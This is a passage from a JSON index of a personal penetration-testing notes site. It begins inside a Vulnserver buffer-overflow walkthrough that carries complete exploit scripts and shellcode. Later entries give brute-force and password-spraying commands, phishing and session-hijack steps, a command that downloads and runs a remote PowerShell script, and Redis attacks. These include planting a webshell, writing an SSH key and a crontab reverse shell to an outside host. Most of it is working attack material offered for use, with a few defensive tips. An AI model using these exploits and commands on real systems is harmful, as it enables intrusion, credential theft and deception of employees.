\u0026quot;); s_string_variable(\u0026quot;b0b\u0026quot;);  Then we run a script called \u0026lsquo;generic_send_tcp\u0026rsquo; from the SPIKE framework that will test this command for us.\ngeneric_send_tcp 192.168.138.130 9999 STATS.spk 0 0\nAfter this is finished running we can look at our debugger. If the program crashed teh debugger will be in a paused state.\nIn this case it looks like STATS is not vulnerable.\nAfter testing the following commands are vulnerable\nTRUN GMON KSTET GTER HTER LTER Fuzzing Now that we know some params are vulnerable to overflows we can start to fuzz and find out where they break. For now we will focus on TRUN.\nFuzzing is sending over \u0026lsquo;junk\u0026rsquo; data in increments, in this example increments of 100 bytes, to find the general point where the program breaks.\nThis can be done with some python code.\n#!/usr/bin/python import socket,sys from time import sleep address = '192.168.136.130' port = 9999 offset = 100 while True: try: buffer = b\u0026quot;\u0026quot; # empty byte var buffer += b\u0026quot;A\u0026quot;*offset # junk times offset print(f'[+] Sending buffer: {str(len(buffer))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s \\r\\n\u0026quot; % buffer) offset += 100 sleep(1) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  When we run this python script it will run until we send over a buffer large enough where it breaks. In this case the program crashed at a buffer of 2109 bytes (TRUN /.:/ + 'A'*2100).\nroot@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py [+] Sending buffer: 109 bytes [+] Sending buffer: 209 bytes [+] Sending buffer: 309 bytes [+] Sending buffer: 409 bytes [+] Sending buffer: 509 bytes [+] Sending buffer: 609 bytes [+] Sending buffer: 709 bytes [+] Sending buffer: 809 bytes [+] Sending buffer: 909 bytes [+] Sending buffer: 1009 bytes [+] Sending buffer: 1109 bytes [+] Sending buffer: 1209 bytes [+] Sending buffer: 1309 bytes [+] Sending buffer: 1409 bytes [+] Sending buffer: 1509 bytes [+] Sending buffer: 1609 bytes [+] Sending buffer: 1709 bytes [+] Sending buffer: 1809 bytes [+] Sending buffer: 1909 bytes [+] Sending buffer: 2009 bytes [+] Sending buffer: 2109 bytes [!] Unable to connect to the application.  Find EIP Offset Now that we know the application crashes at around 2100 bytes we should try to pinpoint the offset of the EIP register.\nWe want todo this since the EIP contains the address of the next instruction, meaning if we control the EIP we can control what the program does next.\nTo find the offset we can use a pattern, one we can use /usr/share/metasploit-framework/tools/exploit/pattern_create.rb\nroot@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200  #!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 #offset = around 2100 pattern = b\u0026quot;Aa0Aa1Aa....7Cu8Cu9Cv0Cv1Cv2C\u0026quot; # output of pattern_create.rb buff = b\u0026quot;\u0026quot; # empty byte var buff = b\u0026quot;%s\u0026quot; % pattern # add pattern to buff try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  EIP value: 386f4337 (8oC7)\nTo find the offset we can use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb\nroot@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337 [*] Exact match at offset 2003  Controlling the ESP Now that we know that the offset to the EIP is 2003 bytes, we need to fill the stack with that many bytes. So if we send over 2003 bytes of junk data we end up at byte 2004. This should be the start of the EIP.\nTo verify that this is indeed the EIP we will fill byte 2004,2005,2006,2007 with B\u0026rsquo;s. This should result in the EIP containing 4 B\u0026rsquo;s (42424242 in hex).\nWe also add some extra junk to get an idea of how much space we have on the stack.\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 buff = b\u0026quot;\u0026quot; # empty byte var buff += b'A'*offset # junk buff += b'B'*4 # EIP buff += b'C'*256 # some more junk on stack after EIP which we want to eventually store our shellcode and jump to. buff += b'D'*256 # this also gives us an idea of how much space we have on the stack. buff += b'E'*128 # buff += b'F'*128 # buff += b'G'*64 # buff += b'H'*64 # buff += b'I'*32 # buff += b'J'*32 # print(buff) try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application.') sys.exit(0) finally: s.close()  Success !\nhere we can see we have at least 960 bytes of space left on the stack to store our shellcode.\nFinding Bad Characters So now that we control the EIP we want to get our shellcode where the C\u0026rsquo;s are right ? Well no, not yet.\nFirst we need to do some \u0026lsquo;house cleaning\u0026rsquo; and remove bad characters.\nBad characters is simply a list of unwanted characters that can would break the shellcode. There is no universal set of bad characters, this depends on the application and the developer logic. That means we have to find the bad characters in vulnserver before writing shellcode.\nSome of the common bad characters are:\n   HEX explanation ascii     00 NULL    0A Line Feed \\n   0D Carriage Return \\r   FF Form Feed \\f    To test for Bad Characters we simply trow every possible character in hex format at the application and see if any of act up.\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 command = b'TRUN /.:/' offset = 2003 bad_chars = [0x00] chars = b\u0026quot;\u0026quot; for i in range(0x00,0xFF+1): if i not in bad_chars: chars += bytes([i]) buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;B\u0026quot;*4 # EIP buff += b\u0026quot;\u0026quot; + chars # test for chars try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Now right click on the ESP and show hexdump\nHere we see all the chars. Now we simply count up from 01 to FF. If any are missing this is a \u0026lsquo;bad character\u0026rsquo; and we should exclude it when generating shellcode.\nFind JMP ESP Now that we know the offset of the EIP, know what characters we can use for our shellcode and saw we have plenty of space on the stack we can start locking for a JMP ESP.\nWe do that since if we find a adresspace in memory where a JMP ESP currently lives and point the EIP at that adresspace we are telling the program to execute what we currently have stored on the stack (i.e. our shellcode).\nTo find a JMP ESP we can start looking for a DLL that has no protection mechanisms. We can do this with a plugin called mona.\n!mona modules\nHere we found a DLL that has no protections enabled.\nNow we can look if this DLL has a JMP ESP. To search for this we need to know the OPCODE equivalent of a JMP ESP.\nIf we don\u0026rsquo;t know this we can use a tool called nasm_shell\nroot@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm \u0026gt; JMP ESP 00000000 FFE4 jmp esp nasm \u0026gt;  !mona find -s \u0026quot;\\xFF\\xE4\u0026quot; -m essfunc.dll\n625011af is the address of a jump point. We want to add this value to our python script in place of the B\u0026rsquo;s.\nBut since where on a x86 system it uses Little Endian Format. This means that the lowest byte is stored at the lowest addres and the highest order byte at the highest.\nSo it will look something like this.\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 shellcode = b\u0026quot;C\u0026quot;*256 buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;\\xAF\\x11\\x50\\x62\u0026quot; # EIP to JMP ESP buff += b'C'*256 # some more junk on stack after EIP which we want to eventually store our shellcode and jump to. buff += b'D'*256 # this also gives us an idea of how much space we have on the stack. buff += b'E'*128 # buff += b'F'*128 # buff += b'G'*64 # buff += b'H'*64 # buff += b'I'*32 # buff += b'J'*32 # try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Now to verify if everything is in place we can add a breakpoint at the JMP ESP address.\nSearch for the address space\nPress F2 to add a breakpoint\nNow if we run our python script we can verify that EIP is pointing at the JMP ESP\nGenerate Shellcode Now that everything is in place we can generate our shellcode. We can do this with MSFvenom.\nThe command below will generate shellcode that will start the windows calculator.\nroot@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\\x00\\' -f c [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 220 (iteration=0) x86/shikata_ga_nai chosen with final size 220 Payload size: 220 bytes Final size of c file: 949 bytes unsigned char buf[] = \u0026quot;\\xbb\\xbb\\x2a\\xfd\\xc1\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\\xb1\u0026quot; \u0026quot;\\x31\\x83\\xed\\xfc\\x31\\x5d\\x0f\\x03\\x5d\\xb4\\xc8\\x08\\x3d\\x22\\x8e\u0026quot; \u0026quot;\\xf3\\xbe\\xb2\\xef\\x7a\\x5b\\x83\\x2f\\x18\\x2f\\xb3\\x9f\\x6a\\x7d\\x3f\u0026quot; \u0026quot;\\x6b\\x3e\\x96\\xb4\\x19\\x97\\x99\\x7d\\x97\\xc1\\x94\\x7e\\x84\\x32\\xb6\u0026quot; \u0026quot;\\xfc\\xd7\\x66\\x18\\x3d\\x18\\x7b\\x59\\x7a\\x45\\x76\\x0b\\xd3\\x01\\x25\u0026quot; \u0026quot;\\xbc\\x50\\x5f\\xf6\\x37\\x2a\\x71\\x7e\\xab\\xfa\\x70\\xaf\\x7a\\x71\\x2b\u0026quot; \u0026quot;\\x6f\\x7c\\x56\\x47\\x26\\x66\\xbb\\x62\\xf0\\x1d\\x0f\\x18\\x03\\xf4\\x5e\u0026quot; \u0026quot;\\xe1\\xa8\\x39\\x6f\\x10\\xb0\\x7e\\x57\\xcb\\xc7\\x76\\xa4\\x76\\xd0\\x4c\u0026quot; \u0026quot;\\xd7\\xac\\x55\\x57\\x7f\\x26\\xcd\\xb3\\x7e\\xeb\\x88\\x30\\x8c\\x40\\xde\u0026quot; \u0026quot;\\x1f\\x90\\x57\\x33\\x14\\xac\\xdc\\xb2\\xfb\\x25\\xa6\\x90\\xdf\\x6e\\x7c\u0026quot; \u0026quot;\\xb8\\x46\\xca\\xd3\\xc5\\x99\\xb5\\x8c\\x63\\xd1\\x5b\\xd8\\x19\\xb8\\x31\u0026quot; \u0026quot;\\x1f\\xaf\\xc6\\x77\\x1f\\xaf\\xc8\\x27\\x48\\x9e\\x43\\xa8\\x0f\\x1f\\x86\u0026quot; \u0026quot;\\x8d\\xe0\\x55\\x8b\\xa7\\x68\\x30\\x59\\xfa\\xf4\\xc3\\xb7\\x38\\x01\\x40\u0026quot; \u0026quot;\\x32\\xc0\\xf6\\x58\\x37\\xc5\\xb3\\xde\\xab\\xb7\\xac\\x8a\\xcb\\x64\\xcc\u0026quot; \u0026quot;\\x9e\\xaf\\xeb\\x5e\\x42\\x1e\\x8e\\xe6\\xe1\\x5e\u0026quot;;  We can now add this shellcode to our python script.\nWe are also going to add something else, a NOP sled.\nA NOP (No-OPeration) is a instruction that does nothing. It simply tells the CPU to skip this instruction and go to the next. When adding a bunch NOPs we create something called a NOP sled. We do this since we cant be certain where in memory we will jump to, so by adding these NOPs the CPU will just glide down the NOPs to our shellcode.\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 shellcode = b\u0026quot;\\xbb\\xbb\\x2a\\xfd\\xc1\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\\xb1\\x31\\x83\\xed\\xfc\\x31\\x5d\\x0f\\x03\\x5d\\xb4\\xc8\\x08\\x3d\\x22\\x8e\\xf3\\xbe\\xb2\\xef\\x7a\\x5b\\x83\\x2f\\x18\\x2f\\xb3\\x9f\\x6a\\x7d\\x3f\\x6b\\x3e\\x96\\xb4\\x19\\x97\\x99\\x7d\\x97\\xc1\\x94\\x7e\\x84\\x32\\xb6\\xfc\\xd7\\x66\\x18\\x3d\\x18\\x7b\\x59\\x7a\\x45\\x76\\x0b\\xd3\\x01\\x25\\xbc\\x50\\x5f\\xf6\\x37\\x2a\\x71\\x7e\\xab\\xfa\\x70\\xaf\\x7a\\x71\\x2b\\x6f\\x7c\\x56\\x47\\x26\\x66\\xbb\\x62\\xf0\\x1d\\x0f\\x18\\x03\\xf4\\x5e\\xe1\\xa8\\x39\\x6f\\x10\\xb0\\x7e\\x57\\xcb\\xc7\\x76\\xa4\\x76\\xd0\\x4c\\xd7\\xac\\x55\\x57\\x7f\\x26\\xcd\\xb3\\x7e\\xeb\\x88\\x30\\x8c\\x40\\xde\\x1f\\x90\\x57\\x33\\x14\\xac\\xdc\\xb2\\xfb\\x25\\xa6\\x90\\xdf\\x6e\\x7c\\xb8\\x46\\xca\\xd3\\xc5\\x99\\xb5\\x8c\\x63\\xd1\\x5b\\xd8\\x19\\xb8\\x31\\x1f\\xaf\\xc6\\x77\\x1f\\xaf\\xc8\\x27\\x48\\x9e\\x43\\xa8\\x0f\\x1f\\x86\\x8d\\xe0\\x55\\x8b\\xa7\\x68\\x30\\x59\\xfa\\xf4\\xc3\\xb7\\x38\\x01\\x40\\x32\\xc0\\xf6\\x58\\x37\\xc5\\xb3\\xde\\xab\\xb7\\xac\\x8a\\xcb\\x64\\xcc\\x9e\\xaf\\xeb\\x5e\\x42\\x1e\\x8e\\xe6\\xe1\\x5e\u0026quot; buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;\\xAF\\x11\\x50\\x62\u0026quot; # EIP to JMP ESP buff += b\u0026quot;\\x90\u0026quot;*32 # NOP sled buff += b\u0026quot;%s\u0026quot; % shellcode # add shellcode to buffer try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Exploit Now just run the script and if everything goes correctly we should be greeted by a friendly calculator.\nAlso see  Gh0x0st/Buffer_Overflow bufferoverflows.net Vulnserver  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/",
	"title": "Credential Stuffing",
	"tags": ["Exploitation"],
	"description": "Stuff those POST fields.",
	"content": "Credential Stuffing Web with Burp Website login POST -\u0026gt; intruder -\u0026gt; clear $ -\u0026gt; Highlight user/password params -\u0026gt; Attacktype Pitchfork -\u0026gt; payload 1, user list -\u0026gt; payload 2, pass list -\u0026gt; run\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/exploit-development/",
	"title": "Exploit Development",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/",
	"title": "Finger",
	"tags": ["Scanning and Enumeration"],
	"description": "Finger me daddy.",
	"content": "Finger msf5 auxiliary(scanner/finger/finger_users) \u0026gt; show options Module options (auxiliary/scanner/finger/finger_users): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 79 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) USERS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of default UNIX accounts.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/",
	"title": "Hydra",
	"tags": ["Exploitation"],
	"description": "Hydra description.",
	"content": "Hydra known username, password list root with passwordlist, null password, login as pass and reversed login as pass.\nhydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr  user list, password list userlist with passwordlist, null password, login as pass and reversed login as pass looped around users.\nhydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/",
	"title": "LLMNR and NBT-NS",
	"tags": ["Active Directory"],
	"description": "LLMNR and NBT-NS.",
	"content": "LLMNR and NBT-NS By default when a DNS lookup fails windows tries to use 2 other components as a fallback. Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS). LLLMNR was introduced in Windows Vista and is the successor to NBT-NS.\nThese protocols help machines on the network identify hosts when DNS fails. So if one machine tries to resolve a particular host, but DNS resolution fails, the machine will then attempt to ask all other machines on the local network for the correct address via LLMNR or NBT-NS.\nAn attacker can listen on a network for these LLMNR (UDP/5355) or NBT-NS (UDP/137) broadcasts and respond to them, thus pretending that the attacker knows the location of the requested host.\nAttacking responder + ntlmrelayx\nDefence  Disable LLMNR and NBT-NS Enable Network Access Control Strong password policy (e.g., 14 characters and limit common word usage)  LLMNR GPO Computer Configuration -\u0026gt; Administrative Templates -\u0026gt; Network -\u0026gt; DNS Client -\u0026gt; Turn Off Multicast Name Resolution -\u0026gt; Enabled\nNBT-NS GPO (startup script) $regkey = \u0026quot;HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\u0026quot; Get-ChildItem $regkey | ForEach { Set-ItemProperty -Path \u0026quot;$regkey\\$($_.pschildname)\u0026quot; -Name NetbiosOptions -Value 2 -Verbose }  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/misconfigured-cloud-assets/",
	"title": "Misconfigured Cloud Assets",
	"tags": ["Reconnaissance"],
	"description": "Misconfigured Cloud Assets.",
	"content": "Misconfigured Cloud Assets AWS Amazon Simple Storage Service (S3) Is secure by default. Can be made public. Nslookup can help reveal region.\nAWS cli # list contents of bucket aws s3 ls s3://\u0026lt;bucketname\u0026gt;/ # download contents of bucket aws s3 sync s3://\u0026lt;bucketname\u0026gt;/ local-dir # s3 code injection aws s3 mv evil-script.html s3://\u0026lt;bucketname\u0026gt;/evil-script.html  Tools: - cloud_enum\nS3 domain hijacking Look for 404\u0026rsquo;s to *.s3.amazonaws.com. If a bucket name is not in use you can register it and load your content on the site.\nElastic Block Storage (EBS) Volumes AWS Virutal harddisks. They can have similar issues to s3 being public.\nTool: dufflebag\nPacu AWS Explotation framework.\nAzure Public Azure Blobs Basically Microsoft version of S3. Blob storage is for unstructed data. Containers and blobs can be publicly accessible via access policies The URLs are predictable.\nstorage-account-name.blob.core.windows.net storage-account-name.file.core.windows.net storage-account-name.table.core.windows.net storage-account-name.queue.core.windows.net\nAccess to blobs Access can be granted on the blob or container.\n  Blob access policy means anyone read a blob, but cant list other blobs in a container\n  Container access policy alowes listing contianers and blobs.\n  Tools:\n Microburst\u0026rsquo;s Invoke-EnumerateAzureBlobs cloud_enum  Google Cloud Platform (GCP) GCP has storage called buckets.\nTools:\n cloud_enum  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/",
	"title": "mitm6",
	"tags": ["Attack Tools"],
	"description": "mitm6 description.",
	"content": "mitm6 Basic command Command below will send out IPv6 RA and catch DNS requests for lab.justin-p.me.\nsudo mitm6 -i eth0 -d lab.justin-p.me  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/",
	"title": "NFS",
	"tags": ["Scanning and Enumeration"],
	"description": "NFS",
	"content": "showmount Usefull when nfs is open.\n111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 40412/udp mountd | 100005 1,2,3 51233/tcp6 mountd | 100005 1,2,3 57722/tcp mountd | 100005 1,2,3 59004/udp6 mountd | 100021 1,3,4 37539/tcp6 nlockmgr | 100021 1,3,4 42654/udp nlockmgr | 100021 1,3,4 49656/udp6 nlockmgr | 100021 1,3,4 54775/tcp nlockmgr | 100024 1 38568/tcp status | 100024 1 50138/udp status | 100024 1 54698/udp6 status | 100024 1 57281/tcp6 status | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 2-3 (RPC #100227)  showmount -e host  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/",
	"title": "Password Spraying",
	"tags": ["Exploitation"],
	"description": "Password Spraying description.",
	"content": "Password Spraying Microsoft Online https://github.com/justin-p/MSOLSpray\nWatch out for AzureAD Smart lockout. Use fireprox and/or the delay param.\nWeb with Burp Website login POST -\u0026gt; intruder -\u0026gt; clear $ -\u0026gt; Highlight user param -\u0026gt; set password -\u0026gt; Attacktype Sniper -\u0026gt; payload 1, user list -\u0026gt; run\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/phising/",
	"title": "phising",
	"tags": ["Reconnaissance"],
	"description": "phising.",
	"content": "Phising Session Hijack Steal creds and/or session cookies. Can be useful when client has good prevention against shells.\nEmail a link to a target employee pointing to a cloned/proxied auth portal (Microsoft Online(O365, Azure), G-suite. AWS Console). When they auuth they get a real session cookies, and so do we.\nTools: Evilginx2, Modlishka\nWhen we get session we need to act fast and setup persistence.\nG-suite G-Suite allowed for Calendar Event Injection. This allows a attacker to silently (without the need for a e-mail by using the API) inject a calendar entry to the users calender. This bypasses the \u0026ldquo;Don\u0026rsquo;t auto-add\u0026rdquo; options. Doing something like this will create urgency with a reminder notification.\nManual This can be prevented by setting \u0026lsquo;Event settings -\u0026gt; Automatically add invitations\u0026rsquo; to \u0026lsquo;No, only show invitations to which I have responded.\u0026rsquo;\n Create a new gmail account with a convincing name Prepair your payload of choice and make it available externally (for example with pwndrop) Open https://calendar.google.com/calendar/ while logged into your new account. Create a new calendar event, make sure to set a reminder.  Ensure you click do not send.  The user will recieve a notification when the \u0026lsquo;meeting\u0026rsquo; is supposed to happen.   API  logon into the account you want to inject as open https://console.developers.google.com/flows/enableapi?apiid=calendar\u0026amp;pli=1 Select Project and agree the ToS\n On the \u0026ldquo;Add credentials to your project\u0026rdquo; page click cancel. At the top of the page, select the \u0026ldquo;OAuth consent screen\u0026rdquo; tab. Select an Email address, enter a Product name if not already set, and click the Save button.\n Select the Credentials tab, click the Create credentials button and select OAuth client ID.\n Select the application type Web application, under \u0026ldquo;Authorized redirect URIs\u0026rdquo; paste in the following address: https://developers.google.com/oauthplayground. Then, click the Create button.\n Copy your \u0026ldquo;Client ID\u0026rdquo; and \u0026ldquo;Client Secret\u0026rdquo;. Navigate here: https://developers.google.com/oauthplayground/. Click the \u0026ldquo;gear icon\u0026rdquo; in the upper right corner and check the box to \u0026ldquo;Use your own OAuth credentials\u0026rdquo;. Enter the OAuth2 client ID and OAuth2 client secret in the boxes. Make sure that \u0026ldquo;OAuth flow\u0026rdquo; is set to Server-side, and \u0026ldquo;Access Type\u0026rdquo; is set to offline.  Select the \u0026ldquo;Calendar API v3\u0026rdquo; dropdown and click both URLs to add them to scope. Click Authorize APIs.  Select the account you want to authorize, then click Allow. (If there is an error such as \u0026ldquo;Error: redirect_uri_mismatch\u0026rdquo; then it’s possible the changes haven’t propagated yet. Just wait a few minutes, hit the back button and try to authorize again.).  You should now be at \u0026ldquo;Step 2: Exchange authorization code for tokens.\u0026rdquo; Click the \u0026ldquo;Exchange authorization code for tokens button\u0026rdquo;. The \u0026ldquo;Access token\u0026rdquo; is the item we need for accessing the API. Copy the value of the \u0026ldquo;Access token\u0026rdquo;. P.S. The \u0026ldquo;Access token\u0026rdquo; expires after 3600 seconds.  PS C:\\Users\\justin-p\u0026gt; iex((iwr https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1).content) PS C:\\Users\\justin-p\u0026gt; Invoke-InjectGEventAPI -PrimaryEmail Injector@gmail.com -AccessToken 'TOKEN' -Targets \u0026quot;InjectToMe@gmail.com\u0026quot; -StartDateTime 2020-09-02T15:20:00 -EndDateTime 2020-09-02T15:30:00 -EventTitle \u0026quot;Company Meeting\u0026quot; -EventDescription \u0026quot;Please review the agenda at the URL below prior to the meeting. https://ElRandoUrl\u0026quot; -EventLocation \u0026quot;Zoom app goes Bzzzzzzzz\u0026quot;  Remote Access Try to comprise workstations. This would (depending on the user) give access to internal and other cloud resources. Allows us to steal tokens from disk, preform session hijack/riding or start keyloggers.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/post-compermise-recon/",
	"title": "post compromise recon",
	"tags": ["Post Exploitation"],
	"description": "post compromise recon.",
	"content": "Post compromise recon  Who do we have access as ? What roles do we have ? is MFA enabled ? What can we access ? Who are the admins and how are we going to escalate to one ? Are there any security protections in place ?  Onprem infrastructure Active Directory BloodHound PowerView RSAT Cloud Infrastucture AWS  Use recon_all module of wierd all to gather a lot of info about our current permissions. Use Pacu\u0026rsquo;s recon modules.  Tools: WierdAAL, pacu\nGCP You can use ScouteSuite, this is noramlly used to audit differnt security providers. ScouteSuite accepts Goolge JSON tokens to auth as a service account.\nAzure Like onprem AD Azure user (noramlly) have access to a bunch of info. This can be locked down however.\nAuthenticated user can go the portal.azure.com and click on \u0026lsquo;Azure Active Directory\u0026rsquo;. The O365 GAL has info like this as wel.\nIf the portal is locked down PowerShell cmdlets can be used to view the same information. This can be disabled org wide with Set-MsolCompanySettings -UsersPermissionToCreateGroupsEnabled $False\nTypes of CLI access  Azure Service Management (ASM) or Azure \u0026lsquo;Classic\u0026rsquo;  legacy, not recommended to use.   Azure Resource Manager (ARM)  Added service principals, resource groups, etc Management certs are not supported as auth.   PowerShell Modules  Az, AzureAd \u0026amp; MSOnline   Azure Corss-platform CLI Tools (both Linux and Windows client.)  Subscriptions Orgs can have multiple subscriptions. Good first step is to determine what subscription you are in, the name is usually informative. Such as Prod or Dev. 1 Azure AD (tenant) can have multiple subscriptions. Each subscriptions can have multiple resource groups.\nbuilt-in subscriptions roles  Owner (full control over resource) Contributer (All rights except the abilty to change permissions) Reader (can only read attributes) USer Access Administrator (manage user access to azure resources)  Gather Company information Get-MSolCompanyInformation  Get Current Subscription and Context Get-AzSubscription Get-AzContext  Gather user information Get the users role assignment\nGet-AzRoleAssignment  Remember, id the Azure AD portal is locked down users maybe still be able to access information using MSOnline cmdlets.\nGet-MSolUser -All Get-MSolGroup -All Get-MSolGroupMember -GroupObjectID \u0026lt;GUID\u0026gt;  Gather resource Group information  Resource Groups collect various services for easier management. Recon can help identify the relationships between services such as WebApps and SQL.  Get-AzResource Get-AzResourceGroup  Azure Runbooks  Azure runbooks automate verious tasks in Azure. Require an Automation Account and can contain sensitive information like passwords  Get info/runbooks\nGet-AzAutomationAccount Get-AzAutomationRunbook -AutomationAccountName \u0026lt;AccountName\u0026gt; -ResourceGroupName \u0026lt;ResourceGroupName\u0026gt;  Export runbooks\nExport-AzAutomationRunbook -AutomationAccountName \u0026lt;AccountName\u0026gt; -ResourceGroupName \u0026lt;ResourceGroupName\u0026gt; -Name \u0026lt;RunbookName\u0026gt; -Outputfolder \u0026lt;OutputFolder\u0026gt;  Tools:\n ROADtools PowerZure Microburst ScoutSuite Stormspotter  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/redis/",
	"title": "Redis",
	"tags": ["Exploitation"],
	"description": "Redis tomfoolery.",
	"content": "Redis Webshell You must know the path of the Web site folder:\nroot@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379\u0026gt; config set dir /usr/share/nginx/html OK 10.85.0.52:6379\u0026gt; config set dbfilename redis.php OK 10.85.0.52:6379\u0026gt; set test \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; OK 10.85.0.52:6379\u0026gt; save OK  SSH  Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e \u0026ldquo;\\n\\n\u0026rdquo;; cat ./.ssh/id_rsa.pub; echo -e \u0026ldquo;\\n\\n\u0026rdquo;) \u0026gt; foo.txt Import the file into redis : cat foo.txt | redis-cli -h 10.85.0.52 -x set givshellplox Save the public key to the authorized_keys file on redis server:  root@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379\u0026gt; config set dir /home/user/.ssh/ OK 10.85.0.52:6379\u0026gt; config set dbfilename \u0026quot;authorized_keys\u0026quot; OK 10.85.0.52:6379\u0026gt; save OK  Reverse shell Crontab root@machine:~# echo -e \u0026quot;\\n\\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026quot;10.10.10.10\\\u0026quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026quot;/bin/sh\\\u0026quot;,\\\u0026quot;-i\\\u0026quot;]);'\\n\\n\u0026quot;|redis-cli -h 10.85.0.52 -x set 1 OK 